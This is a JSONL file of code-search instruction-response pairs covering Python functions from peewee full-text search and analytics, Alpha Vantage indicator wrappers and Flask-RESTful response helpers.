{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfull - text search for selected term using BM25 algorithm.", "response": "def search_bm25(cls, term, weights=None, with_score=False,\n                    score_alias='score', explicit_ordering=False):\n        \"\"\"Full-text search for selected `term` using BM25 algorithm.\"\"\"\n        return cls._search(\n            term,\n            weights,\n            with_score,\n            score_alias,\n            cls.bm25,\n            explicit_ordering)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfull - text search for selected term using BM25 algorithm.", "response": "def search_bm25f(cls, term, weights=None, with_score=False,\n                     score_alias='score', explicit_ordering=False):\n        \"\"\"Full-text search for selected `term` using BM25 algorithm.\"\"\"\n        return cls._search(\n            term,\n            weights,\n            with_score,\n            score_alias,\n            cls.bm25f,\n            explicit_ordering)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfull - text search for selected term using Lucene search.", "response": "def search_lucene(cls, term, weights=None, with_score=False,\n                      score_alias='score', explicit_ordering=False):\n        \"\"\"Full-text search for selected `term` using BM25 algorithm.\"\"\"\n        return cls._search(\n            term,\n            weights,\n            with_score,\n            score_alias,\n            cls.lucene,\n            explicit_ordering)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nclean a query of invalid tokens.", "response": "def clean_query(query, replace=chr(26)):\n        \"\"\"\n        Clean a query of invalid tokens.\n        \"\"\"\n        accum = []\n        any_invalid = False\n        tokens = _quote_re.findall(query)\n        for token in tokens:\n            if token.startswith('\"') and token.endswith('\"'):\n                accum.append(token)\n                continue\n            token_set = set(token)\n            invalid_for_token = token_set & _invalid_ascii\n            if invalid_for_token:\n                any_invalid = True\n                for c in invalid_for_token:\n                    token = token.replace(c, replace)\n            accum.append(token)\n\n        if any_invalid:\n            return ' '.join(accum)\n        return query"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef search(cls, term, weights=None, with_score=False, score_alias='score',\n               explicit_ordering=False):\n        \"\"\"Full-text search using selected `term`.\"\"\"\n        return cls.search_bm25(\n            FTS5Model.clean_query(term),\n            weights,\n            with_score,\n            score_alias,\n            explicit_ordering)", "response": "Full - text search using selected term."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef search_bm25(cls, term, weights=None, with_score=False,\n                    score_alias='score', explicit_ordering=False):\n        \"\"\"Full-text search using selected `term`.\"\"\"\n        if not weights:\n            rank = SQL('rank')\n        elif isinstance(weights, dict):\n            weight_args = []\n            for field in cls._meta.sorted_fields:\n                if isinstance(field, SearchField) and not field.unindexed:\n                    weight_args.append(\n                        weights.get(field, weights.get(field.name, 1.0)))\n            rank = fn.bm25(cls._meta.entity, *weight_args)\n        else:\n            rank = fn.bm25(cls._meta.entity, *weights)\n\n        selection = ()\n        order_by = rank\n        if with_score:\n            selection = (cls, rank.alias(score_alias))\n        if with_score and not explicit_ordering:\n            order_by = SQL(score_alias)\n\n        return (cls\n                .select(*selection)\n                .where(cls.match(FTS5Model.clean_query(term)))\n                .order_by(order_by))", "response": "Full - text search using selected term."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncloses the underlying connection without returning it to the pool.", "response": "def manual_close(self):\n        \"\"\"\n        Close the underlying connection without returning it to the pool.\n        \"\"\"\n        if self.is_closed():\n            return False\n\n        # Obtain reference to the connection in-use by the calling thread.\n        conn = self.connection()\n\n        # A connection will only be re-added to the available list if it is\n        # marked as \"in use\" at the time it is closed. We will explicitly\n        # remove it from the \"in use\" list, call \"close()\" for the\n        # side-effects, and then explicitly close the connection.\n        self._in_use.pop(self.conn_key(conn), None)\n        self.close()\n        self._close(conn, close_conn=True)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef top_pages_by_time_period(self, interval='day'):\n        date_trunc = fn.date_trunc(interval, PageView.timestamp)\n        return (self.get_query()\n                .select(\n                    PageView.url,\n                    date_trunc.alias(interval),\n                    fn.Count(PageView.id).alias('count'))\n                .group_by(PageView.url, date_trunc)\n                .order_by(\n                    SQL(interval),\n                    SQL('count').desc(),\n                    PageView.url))", "response": "Get a breakdown of top pages per interval"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving the cookies header from all the users who visited them.", "response": "def cookies(self):\n        \"\"\"\n        Retrieve the cookies header from all the users who visited.\n        \"\"\"\n        return (self.get_query()\n                .select(PageView.ip, PageView.headers['Cookie'])\n                .where(PageView.headers['Cookie'].is_null(False))\n                .tuples())"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nretrieve user - agents sorted by most common to least common.", "response": "def user_agents(self):\n        \"\"\"\n        Retrieve user-agents, sorted by most common to least common.\n        \"\"\"\n        return (self.get_query()\n                .select(\n                    PageView.headers['User-Agent'],\n                    fn.Count(PageView.id))\n                .group_by(PageView.headers['User-Agent'])\n                .order_by(fn.Count(PageView.id).desc())\n                .tuples())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nretrieve languages in the database sorted by most common to least common.", "response": "def languages(self):\n        \"\"\"\n        Retrieve languages, sorted by most common to least common. The\n        Accept-Languages header sometimes looks weird, i.e.\n        \"en-US,en;q=0.8,is;q=0.6,da;q=0.4\" We will split on the first semi-\n        colon.\n        \"\"\"\n        language = PageView.headers['Accept-Language']\n        first_language = fn.SubStr(\n            language,  # String to slice.\n            1,  # Left index.\n            fn.StrPos(language, ';'))\n        return (self.get_query()\n                .select(first_language, fn.Count(PageView.id))\n                .group_by(first_language)\n                .order_by(fn.Count(PageView.id).desc())\n                .tuples())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting all visitors by IP and then list the pages they visited in order.", "response": "def trail(self):\n        \"\"\"\n        Get all visitors by IP and then list the pages they visited in order.\n        \"\"\"\n        inner = (self.get_query()\n                 .select(PageView.ip, PageView.url)\n                 .order_by(PageView.timestamp))\n        return (PageView\n                .select(\n                    PageView.ip,\n                    fn.array_agg(PageView.url).alias('urls'))\n                .from_(inner.alias('t1'))\n                .group_by(PageView.ip))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of all top referrer pages.", "response": "def top_referrers(self, domain_only=True):\n        \"\"\"\n        What domains send us the most traffic?\n        \"\"\"\n        referrer = self._referrer_clause(domain_only)\n        return (self.get_query()\n                .select(referrer, fn.Count(PageView.id))\n                .group_by(referrer)\n                .order_by(fn.Count(PageView.id).desc())\n                .tuples())"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding entry to the archive.", "response": "def add_entry():\n    \"\"\"Add entry\"\"\"\n    print('Enter your entry. Press ctrl+d when finished.')\n    data = sys.stdin.read().strip()\n    if data and raw_input('Save entry? [Yn] ') != 'n':\n        Entry.create(content=data)\n        print('Saved successfully.')"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef html_content(self):\n        hilite = CodeHiliteExtension(linenums=False, css_class='highlight')\n        extras = ExtraExtension()\n        markdown_content = markdown(self.content, extensions=[hilite, extras])\n        oembed_content = parse_html(\n            markdown_content,\n            oembed_providers,\n            urlize_all=True,\n            maxwidth=app.config['SITE_WIDTH'])\n        return Markup(oembed_content)", "response": "Generate HTML representation of the blog entry and also convert any media URLs into rich media objects such as video\n        players or images."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts a model instance to a dictionary.", "response": "def model_to_dict(model, recurse=True, backrefs=False, only=None,\n                  exclude=None, seen=None, extra_attrs=None,\n                  fields_from_query=None, max_depth=None, manytomany=False):\n    \"\"\"\n    Convert a model instance (and any related objects) to a dictionary.\n\n    :param bool recurse: Whether foreign-keys should be recursed.\n    :param bool backrefs: Whether lists of related objects should be recursed.\n    :param only: A list (or set) of field instances indicating which fields\n        should be included.\n    :param exclude: A list (or set) of field instances that should be\n        excluded from the dictionary.\n    :param list extra_attrs: Names of model instance attributes or methods\n        that should be included.\n    :param SelectQuery fields_from_query: Query that was source of model. Take\n        fields explicitly selected by the query and serialize them.\n    :param int max_depth: Maximum depth to recurse, value <= 0 means no max.\n    :param bool manytomany: Process many-to-many fields.\n    \"\"\"\n    max_depth = -1 if max_depth is None else max_depth\n    if max_depth == 0:\n        recurse = False\n\n    only = _clone_set(only)\n    extra_attrs = _clone_set(extra_attrs)\n    should_skip = lambda n: (n in exclude) or (only and (n not in only))\n\n    if fields_from_query is not None:\n        for item in fields_from_query._returning:\n            if isinstance(item, Field):\n                only.add(item)\n            elif isinstance(item, Alias):\n                extra_attrs.add(item._alias)\n\n    data = {}\n    exclude = _clone_set(exclude)\n    seen = _clone_set(seen)\n    exclude |= seen\n    model_class = type(model)\n\n    if manytomany:\n        for name, m2m in model._meta.manytomany.items():\n            if should_skip(name):\n                continue\n\n            exclude.update((m2m, m2m.rel_model._meta.manytomany[m2m.backref]))\n            for fkf in m2m.through_model._meta.refs:\n                exclude.add(fkf)\n\n            accum = []\n            for rel_obj in getattr(model, name):\n                accum.append(model_to_dict(\n                    rel_obj,\n                    recurse=recurse,\n                    backrefs=backrefs,\n                    only=only,\n                    exclude=exclude,\n                    max_depth=max_depth - 1))\n            data[name] = accum\n\n    for field in model._meta.sorted_fields:\n        if should_skip(field):\n            continue\n\n        field_data = model.__data__.get(field.name)\n        if isinstance(field, ForeignKeyField) and recurse:\n            if field_data:\n                seen.add(field)\n                rel_obj = getattr(model, field.name)\n                field_data = model_to_dict(\n                    rel_obj,\n                    recurse=recurse,\n                    backrefs=backrefs,\n                    only=only,\n                    exclude=exclude,\n                    seen=seen,\n                    max_depth=max_depth - 1)\n            else:\n                field_data = None\n\n        data[field.name] = field_data\n\n    if extra_attrs:\n        for attr_name in extra_attrs:\n            attr = getattr(model, attr_name)\n            if callable_(attr):\n                data[attr_name] = attr()\n            else:\n                data[attr_name] = attr\n\n    if backrefs and recurse:\n        for foreign_key, rel_model in model._meta.backrefs.items():\n            if foreign_key.backref == '+': continue\n            descriptor = getattr(model_class, foreign_key.backref)\n            if descriptor in exclude or foreign_key in exclude:\n                continue\n            if only and (descriptor not in only) and (foreign_key not in only):\n                continue\n\n            accum = []\n            exclude.add(foreign_key)\n            related_query = getattr(model, foreign_key.backref)\n\n            for rel_obj in related_query:\n                accum.append(model_to_dict(\n                    rel_obj,\n                    recurse=recurse,\n                    backrefs=backrefs,\n                    only=only,\n                    exclude=exclude,\n                    max_depth=max_depth - 1))\n\n            data[foreign_key.backref] = accum\n\n    return data"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _e(op, inv=False):\n        def inner(self, rhs):\n            if inv:\n                return Expression(rhs, op, self)\n            return Expression(self, op, rhs)\n        return inner", "response": "A factory for creating an Expression that builds an Expression consisting of the left - hand operands using op."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the intraday exchange rate for any pair of physical currency (e.g., EUR) or physical currency (e.g., USD). Keyword Arguments: from_symbol: The currency you would like to get the exchange rate for. For example: from_currency=EUR or from_currency=USD. to_symbol: The destination currency for the exchange rate. For example: to_currency=USD or to_currency=JPY. interval: time interval between two conscutive values, supported values are '1min', '5min', '15min', '30min', '60min' (default '15min') outputsize: The size of the call, supported values are 'compact' and 'full; the first returns the last 100 points in the data series, and 'full' returns the full-length intraday times series, commonly above 1MB (default 'compact')", "response": "def get_currency_exchange_intraday(self, from_symbol, to_symbol, interval='15min', outputsize='compact'):\n        \"\"\" Returns the intraday exchange rate for any pair of physical\n        currency (e.g., EUR) or physical currency (e.g., USD).\n\n        Keyword Arguments:\n            from_symbol: The currency you would like to get the exchange rate\n                for.\n                For example: from_currency=EUR or from_currency=USD.\n            to_symbol: The destination currency for the exchange rate.\n                For example: to_currency=USD or to_currency=JPY.\n            interval:  time interval between two conscutive values,\n                supported values are '1min', '5min', '15min', '30min', '60min'\n                (default '15min')\n            outputsize:  The size of the call, supported values are\n                'compact' and 'full; the first returns the last 100 points in the\n                data series, and 'full' returns the full-length intraday times\n                series, commonly above 1MB (default 'compact')\n        \"\"\"\n        _FUNCTION_KEY = 'FX_INTRADAY'\n        return _FUNCTION_KEY, \"Time Series FX ({})\".format(interval), 'Meta Data'"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _output_format(cls, func, override=None):\n        @wraps(func)\n        def _format_wrapper(self, *args, **kwargs):\n            call_response, data_key, meta_data_key = func(\n                self, *args, **kwargs)\n            if 'json' in self.output_format.lower() or 'pandas' \\\n                    in self.output_format.lower():\n                data = call_response[data_key]\n                if meta_data_key is not None:\n                    meta_data = call_response[meta_data_key]\n                else:\n                    meta_data = None\n                # Allow to override the output parameter in the call\n                if override is None:\n                    output_format = self.output_format.lower()\n                elif 'json' or 'pandas' in override.lower():\n                    output_format = override.lower()\n                # Choose output format\n                if output_format == 'json':\n                    return data, meta_data\n                elif output_format == 'pandas':\n                    if isinstance(data, list):\n                        # If the call returns a list, then we will append them\n                        # in the resulting data frame. If in the future\n                        # alphavantage decides to do more with returning arrays\n                        # this might become buggy. For now will do the trick.\n                        data_array = []\n                        for val in data:\n                            data_array.append([v for _, v in val.items()])\n                        data_pandas = pandas.DataFrame(data_array, columns=[\n                            k for k, _ in data[0].items()])\n                    else:\n                        data_pandas = pandas.DataFrame.from_dict(data,\n                                                                 orient='index',\n                                                                 dtype=float)\n                    data_pandas.index.name = 'date'\n                    if 'integer' in self.indexing_type:\n                        # Set Date as an actual column so a new numerical index\n                        # will be created, but only when specified by the user.\n                        data_pandas.reset_index(level=0, inplace=True)\n                    return data_pandas, meta_data\n            elif 'csv' in self.output_format.lower():\n                return call_response, None\n            else:\n                raise ValueError('Format: {} is not supported'.format(\n                    self.output_format))\n        return _format_wrapper", "response": "Decorator to give the output format of the object in the internal format"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nconverts to the alpha vantage math type integer. It returns an integer correspondent to the type of math to apply to a function. It raises ValueError if an integer greater than the supported math types is given. Keyword Arguments: matype: The math type of the alpha vantage api. It accepts integers or a string representing the math type. * 0 = Simple Moving Average (SMA), * 1 = Exponential Moving Average (EMA), * 2 = Weighted Moving Average (WMA), * 3 = Double Exponential Moving Average (DEMA), * 4 = Triple Exponential Moving Average (TEMA), * 5 = Triangular Moving Average (TRIMA), * 6 = T3 Moving Average, * 7 = Kaufman Adaptive Moving Average (KAMA), * 8 = MESA Adaptive Moving Average (MAMA)", "response": "def map_to_matype(self, matype):\n        \"\"\" Convert to the alpha vantage math type integer. It returns an\n        integer correspondent to the type of math to apply to a function. It\n        raises ValueError if an integer greater than the supported math types\n        is given.\n\n        Keyword Arguments:\n            matype:  The math type of the alpha vantage api. It accepts\n            integers or a string representing the math type.\n\n                * 0 = Simple Moving Average (SMA),\n                * 1 = Exponential Moving Average (EMA),\n                * 2 = Weighted Moving Average (WMA),\n                * 3 = Double Exponential Moving Average (DEMA),\n                * 4 = Triple Exponential Moving Average (TEMA),\n                * 5 = Triangular Moving Average (TRIMA),\n                * 6 = T3 Moving Average,\n                * 7 = Kaufman Adaptive Moving Average (KAMA),\n                * 8 = MESA Adaptive Moving Average (MAMA)\n        \"\"\"\n        # Check if it is an integer or a string\n        try:\n            value = int(matype)\n            if abs(value) > len(AlphaVantage._ALPHA_VANTAGE_MATH_MAP):\n                raise ValueError(\"The value {} is not supported\".format(value))\n        except ValueError:\n            value = AlphaVantage._ALPHA_VANTAGE_MATH_MAP.index(matype)\n        return value"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nhandle the return call from the api and return a data and meta_data_object object. It raises a ValueError on problems", "response": "def _handle_api_call(self, url):\n        \"\"\" Handle the return call from the  api and return a data and meta_data\n        object. It raises a ValueError on problems\n\n        Keyword Arguments:\n            url:  The url of the service\n            data_key:  The key for getting the data from the jso object\n            meta_data_key:  The key for getting the meta data information out\n            of the json object\n        \"\"\"\n        response = requests.get(url, proxies=self.proxy)\n        if 'json' in self.output_format.lower() or 'pandas' in \\\n                self.output_format.lower():\n            json_response = response.json()\n            if \"Error Message\" in json_response:\n                raise ValueError(json_response[\"Error Message\"])\n            elif \"Information\" in json_response and self.treat_info_as_error:\n                raise ValueError(json_response[\"Information\"])\n            elif \"Note\" in json_response and self.treat_info_as_error:\n                raise ValueError(json_response[\"Note\"])\n            return json_response\n        else:\n            csv_response = csv.reader(response.text.splitlines())\n            if not csv_response:\n                raise ValueError(\n                    'Error getting data from the api, no return was given.')\n            return csv_response"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the moving average convergence/divergence time series in two json objects as data and meta_data. It raises ValueError when problems arise Keyword Arguments: symbol: the symbol for the equity we want to get its data interval: time interval between two conscutive values, supported values are '1min', '5min', '15min', '30min', '60min', 'daily', 'weekly', 'monthly' (default 'daily' series_type: The desired price type in the time series. Four types are supported: 'close', 'open', 'high', 'low' (default 'close') fastperiod: Positive integers are accepted (default=None) slowperiod: Positive integers are accepted (default=None) signalperiod: Positive integers are accepted (default=None)", "response": "def get_macd(self, symbol, interval='daily', series_type='close',\n                 fastperiod=None, slowperiod=None, signalperiod=None):\n        \"\"\" Return the moving average convergence/divergence time series in two\n        json objects as data and meta_data. It raises ValueError when problems\n        arise\n\n        Keyword Arguments:\n            symbol:  the symbol for the equity we want to get its data\n            interval:  time interval between two conscutive values,\n                supported values are '1min', '5min', '15min', '30min', '60min', 'daily',\n                'weekly', 'monthly' (default 'daily'\n            series_type:  The desired price type in the time series. Four types\n                are supported: 'close', 'open', 'high', 'low' (default 'close')\n            fastperiod:  Positive integers are accepted (default=None)\n            slowperiod:  Positive integers are accepted (default=None)\n            signalperiod:  Positive integers are accepted (default=None)\n        \"\"\"\n        _FUNCTION_KEY = \"MACD\"\n        return _FUNCTION_KEY, 'Technical Analysis: MACD', 'Meta Data'"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_macdext(self, symbol, interval='daily', series_type='close',\n                    fastperiod=None, slowperiod=None, signalperiod=None, fastmatype=None,\n                    slowmatype=None, signalmatype=None):\n        \"\"\" Return the moving average convergence/divergence time series in two\n        json objects as data and meta_data. It raises ValueError when problems\n        arise\n\n        Keyword Arguments:\n            symbol:  the symbol for the equity we want to get its data\n            interval:  time interval between two conscutive values,\n                supported values are '1min', '5min', '15min', '30min', '60min', 'daily',\n                'weekly', 'monthly' (default 'daily')\n            series_type:  The desired price type in the time series. Four types\n                are supported: 'close', 'open', 'high', 'low' (default 'close')\n            fastperiod:  Positive integers are accepted (default=None)\n            slowperiod:  Positive integers are accepted (default=None)\n            signalperiod:  Positive integers are accepted (default=None)\n            fastmatype:  Moving average type for the faster moving average.\n                By default, fastmatype=0. Integers 0 - 8 are accepted\n                (check  down the mappings) or the string containing the math type can\n                also be used.\n            slowmatype:  Moving average type for the slower moving average.\n                By default, slowmatype=0. Integers 0 - 8 are accepted\n                (check down the mappings) or the string containing the math type can\n                also be used.\n            signalmatype:  Moving average type for the signal moving average.\n                By default, signalmatype=0. Integers 0 - 8 are accepted\n                (check down the mappings) or the string containing the math type can\n                also be used.\n\n                * 0 = Simple Moving Average (SMA),\n                * 1 = Exponential Moving Average (EMA),\n                * 2 = Weighted Moving Average (WMA),\n                * 3 = Double Exponential Moving Average (DEMA),\n                * 4 = Triple Exponential Moving Average (TEMA),\n                * 5 = Triangular Moving Average (TRIMA),\n                * 6 = T3 Moving Average,\n                * 7 = Kaufman Adaptive Moving Average (KAMA),\n                * 8 = MESA Adaptive Moving Average (MAMA)\n        \"\"\"\n        _FUNCTION_KEY = \"MACDEXT\"\n        return _FUNCTION_KEY, 'Technical Analysis: MACDEXT', 'Meta Data'", "response": "This function returns the convergence or divergence time series in two - tuple json objects as data and meta_data. It raises ValueError when problems are encountered."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_stoch(self, symbol, interval='daily', fastkperiod=None,\n                  slowkperiod=None, slowdperiod=None, slowkmatype=None, slowdmatype=None):\n        \"\"\" Return the stochatic oscillator values in two\n        json objects as data and meta_data. It raises ValueError when problems\n        arise\n\n        Keyword Arguments:\n            symbol:  the symbol for the equity we want to get its data\n            interval:  time interval between two conscutive values,\n                supported values are '1min', '5min', '15min', '30min', '60min', 'daily',\n                'weekly', 'monthly' (default 'daily')\n            fastkperiod:  The time period of the fastk moving average. Positive\n                integers are accepted (default=None)\n            slowkperiod:  The time period of the slowk moving average. Positive\n                integers are accepted (default=None)\n            slowdperiod: The time period of the slowd moving average. Positive\n                integers are accepted (default=None)\n            slowkmatype:  Moving average type for the slowk moving average.\n                By default, fastmatype=0. Integers 0 - 8 are accepted\n                (check  down the mappings) or the string containing the math type can\n                also be used.\n            slowdmatype:  Moving average type for the slowd moving average.\n                By default, slowmatype=0. Integers 0 - 8 are accepted\n                (check down the mappings) or the string containing the math type can\n                also be used.\n\n                * 0 = Simple Moving Average (SMA),\n                * 1 = Exponential Moving Average (EMA),\n                * 2 = Weighted Moving Average (WMA),\n                * 3 = Double Exponential Moving Average (DEMA),\n                * 4 = Triple Exponential Moving Average (TEMA),\n                * 5 = Triangular Moving Average (TRIMA),\n                * 6 = T3 Moving Average,\n                * 7 = Kaufman Adaptive Moving Average (KAMA),\n                * 8 = MESA Adaptive Moving Average (MAMA)\n        \"\"\"\n        _FUNCTION_KEY = \"STOCH\"\n        return _FUNCTION_KEY, 'Technical Analysis: STOCH', 'Meta Data'", "response": "Returns the stochatic oscillator values in two - tuple json objects as data and meta_data."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_stochrsi(self, symbol, interval='daily', time_period=20,\n                     series_type='close', fastkperiod=None, fastdperiod=None, fastdmatype=None):\n        \"\"\" Return the stochatic relative strength index in two\n        json objects as data and meta_data. It raises ValueError when problems\n        arise\n\n        Keyword Arguments:\n            symbol:  the symbol for the equity we want to get its data\n            interval:  time interval between two conscutive values,\n                supported values are '1min', '5min', '15min', '30min', '60min', 'daily',\n                'weekly', 'monthly' (default 'daily')\n            time_period:  How many data points to average (default 20)\n            series_type:  The desired price type in the time series. Four types\n                are supported: 'close', 'open', 'high', 'low' (default 'close')\n            fastkperiod:  The time period of the fastk moving average. Positive\n                integers are accepted (default=None)\n            fastdperiod:  The time period of the fastd moving average. Positive\n                integers are accepted (default=None)\n            fastdmatype:  Moving average type for the fastdmatype moving average.\n                By default, fastmatype=0. Integers 0 - 8 are accepted\n                (check  down the mappings) or the string containing the math type can\n                also be used.\n\n                * 0 = Simple Moving Average (SMA),\n                * 1 = Exponential Moving Average (EMA),\n                * 2 = Weighted Moving Average (WMA),\n                * 3 = Double Exponential Moving Average (DEMA),\n                * 4 = Triple Exponential Moving Average (TEMA),\n                * 5 = Triangular Moving Average (TRIMA),\n                * 6 = T3 Moving Average,\n                * 7 = Kaufman Adaptive Moving Average (KAMA),\n                * 8 = MESA Adaptive Moving Average (MAMA)\n        \"\"\"\n        _FUNCTION_KEY = \"STOCHRSI\"\n        return _FUNCTION_KEY, 'Technical Analysis: STOCHRSI', 'Meta Data'", "response": "Return the stochatic relative strength index in json objects as data and meta_data."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the absolute price oscillator values in two - item json objects as data and meta_data.", "response": "def get_apo(self, symbol, interval='daily', series_type='close',\n                fastperiod=None, slowperiod=None, matype=None):\n        \"\"\" Return the absolute price oscillator values in two\n        json objects as data and meta_data. It raises ValueError when problems\n        arise\n\n        Keyword Arguments:\n            symbol:  the symbol for the equity we want to get its data\n            interval:  time interval between two conscutive values,\n                supported values are '1min', '5min', '15min', '30min', '60min', 'daily',\n                'weekly', 'monthly' (default '60min)'\n            series_type:  The desired price type in the time series. Four types\n                are supported: 'close', 'open', 'high', 'low' (default 'close')\n            fastperiod:  Positive integers are accepted (default=None)\n            slowperiod:  Positive integers are accepted (default=None)\n            matype    :  Moving average type. By default, fastmatype=0.\n                Integers 0 - 8 are accepted (check  down the mappings) or the string\n                containing the math type can also be used.\n\n                * 0 = Simple Moving Average (SMA),\n                * 1 = Exponential Moving Average (EMA),\n                * 2 = Weighted Moving Average (WMA),\n                * 3 = Double Exponential Moving Average (DEMA),\n                * 4 = Triple Exponential Moving Average (TEMA),\n                * 5 = Triangular Moving Average (TRIMA),\n                * 6 = T3 Moving Average,\n                * 7 = Kaufman Adaptive Moving Average (KAMA),\n                * 8 = MESA Adaptive Moving Average (MAMA)\n        \"\"\"\n        _FUNCTION_KEY = \"APO\"\n        return _FUNCTION_KEY, 'Technical Analysis: APO', 'Meta Data'"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_bbands(self, symbol, interval='daily', time_period=20,  series_type='close',\n                   nbdevup=None, nbdevdn=None, matype=None):\n        \"\"\" Return the bollinger bands values in two\n        json objects as data and meta_data. It raises ValueError when problems\n        arise\n\n        Keyword Arguments:\n            symbol:  the symbol for the equity we want to get its data\n            interval:  time interval between two conscutive values,\n                supported values are '1min', '5min', '15min', '30min', '60min', 'daily',\n                'weekly', 'monthly' (default 'daily'\n            series_type:  The desired price type in the time series. Four types\n                are supported: 'close', 'open', 'high', 'low' (default 'close')\n            nbdevup:  The standard deviation multiplier of the upper band. Positive\n                integers are accepted as default (default=2)\n            nbdevdn:  The standard deviation multiplier of the lower band. Positive\n                integers are accepted as default (default=2)\n            matype :  Moving average type. By default, matype=0.\n                Integers 0 - 8 are accepted (check  down the mappings) or the string\n                containing the math type can also be used.\n\n                * 0 = Simple Moving Average (SMA),\n                * 1 = Exponential Moving Average (EMA),\n                * 2 = Weighted Moving Average (WMA),\n                * 3 = Double Exponential Moving Average (DEMA),\n                * 4 = Triple Exponential Moving Average (TEMA),\n                * 5 = Triangular Moving Average (TRIMA),\n                * 6 = T3 Moving Average,\n                * 7 = Kaufman Adaptive Moving Average (KAMA),\n                * 8 = MESA Adaptive Moving Average (MAMA)\n        \"\"\"\n        _FUNCTION_KEY = \"BBANDS\"\n        return _FUNCTION_KEY, 'Technical Analysis: BBANDS', 'Meta Data'", "response": "Return the bollinger bands values in two - band format as data and meta_data."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef unpack(value):\n    if not isinstance(value, tuple):\n        return value, 200, {}\n\n    try:\n        data, code, headers = value\n        return data, code, headers\n    except ValueError:\n        pass\n\n    try:\n        data, code = value\n        return data, code, {}\n    except ValueError:\n        pass\n\n    return value, 200, {}", "response": "Return a three tuple of data code and headers"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmakes a Flask response with a XML encoded body", "response": "def output_xml(data, code, headers=None):\n    \"\"\"Makes a Flask response with a XML encoded body\"\"\"\n    resp = make_response(dumps({'response' :data}), code)\n    resp.headers.extend(headers or {})\n    return resp"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nmake a Flask response with a JSON encoded body", "response": "def output_json(data, code, headers=None):\n    \"\"\"Makes a Flask response with a JSON encoded body\"\"\"\n\n    settings = current_app.config.get('RESTFUL_JSON', {})\n\n    # If we're in debug mode, and the indent is not set, we set it to a\n    # reasonable value here.  Note that this won't override any existing value\n    # that was set.  We also set the \"sort_keys\" value.\n    if current_app.debug:\n        settings.setdefault('indent', 4)\n        settings.setdefault('sort_keys', not PY3)\n\n    # always end the json dumps with a new line\n    # see https://github.com/mitsuhiko/flask/pull/1262\n    dumped = dumps(data, **settings) + \"\\n\"\n\n    resp = make_response(dumped, code)\n    resp.headers.extend(headers or {})\n    return resp"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef abort(http_status_code, **kwargs):\n    #noinspection PyUnresolvedReferences\n    try:\n        original_flask_abort(http_status_code)\n    except HTTPException as e:\n        if len(kwargs):\n            e.data = kwargs\n        raise", "response": "Raise a HTTPException for the given http_status_code."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ntakes raw data and a dict of fields to output and filters the data based on those fields.", "response": "def marshal(data, fields, envelope=None):\n    \"\"\"Takes raw data (in the form of a dict, list, object) and a dict of\n    fields to output and filters the data based on those fields.\n\n    :param data: the actual object(s) from which the fields are taken from\n    :param fields: a dict of whose keys will make up the final serialized\n                   response output\n    :param envelope: optional key that will be used to envelop the serialized\n                     response\n\n\n    >>> from flask_restful import fields, marshal\n    >>> data = { 'a': 100, 'b': 'foo' }\n    >>> mfields = { 'a': fields.Raw }\n\n    >>> marshal(data, mfields)\n    OrderedDict([('a', 100)])\n\n    >>> marshal(data, mfields, envelope='data')\n    OrderedDict([('data', OrderedDict([('a', 100)]))])\n\n    \"\"\"\n\n    def make(cls):\n        if isinstance(cls, type):\n            return cls()\n        return cls\n\n    if isinstance(data, (list, tuple)):\n        return (OrderedDict([(envelope, [marshal(d, fields) for d in data])])\n                if envelope else [marshal(d, fields) for d in data])\n\n    items = ((k, marshal(data, v) if isinstance(v, dict)\n              else make(v).output(k, data))\n             for k, v in fields.items())\n    return OrderedDict([(envelope, OrderedDict(items))]) if envelope else OrderedDict(items)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ninitializes this class with the given Flask application or blueprint object.", "response": "def init_app(self, app):\n        \"\"\"Initialize this class with the given :class:`flask.Flask`\n        application or :class:`flask.Blueprint` object.\n\n        :param app: the Flask application or blueprint object\n        :type app: flask.Flask\n        :type app: flask.Blueprint\n\n        Examples::\n\n            api = Api()\n            api.add_resource(...)\n            api.init_app(app)\n\n        \"\"\"\n        # If app is a blueprint, defer the initialization\n        try:\n            app.record(self._deferred_blueprint_init)\n        # Flask.Blueprint has a 'record' attribute, Flask.Api does not\n        except AttributeError:\n            self._init_app(app)\n        else:\n            self.blueprint = app"}
